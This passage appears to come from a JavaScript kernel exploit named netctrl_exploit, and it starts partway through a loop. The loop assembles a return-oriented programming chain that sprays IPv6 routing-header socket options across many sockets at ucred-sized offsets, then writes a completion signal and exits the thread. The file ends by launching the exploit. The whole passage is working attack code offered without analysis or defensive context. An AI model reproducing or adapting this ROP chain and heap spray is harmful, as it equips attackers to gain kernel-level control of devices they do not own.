        if (i === master || i === other) {
            continue;
        }

        rop.push(gadgets.POP_RDI_RET);
        rop.push(ipv6_socks[i]);
        rop.push(gadgets.POP_RSI_RET);
        rop.push(IPPROTO_IPV6);
        rop.push(gadgets.POP_RDX_RET);
        rop.push(IPV6_RTHDR);
        rop.push(gadgets.POP_RCX_RET);
        rop.push(spray_rthdr_rop.add(i*UCRED_SIZE)) // Offset for socket i
        rop.push(gadgets.POP_R8_RET);
        rop.push(spray_rthdr_len);
        rop.push(setsockopt_wrapper);
    }

    // Signal done - write 1 to deletion_signal
    rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
    rop.push(done_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    // Exit
    rop.push(gadgets.POP_RDI_RET)
    rop.push(0)
    rop.push(thr_exit_wrapper)

    var loop_end = rop.length;
    var loop_size = loop_end - loop_init;

    // It's gonna loop

    return {
        rop: rop,
        loop_size: 0//loop_size
    }

}

netctrl_exploit();
//cleanup();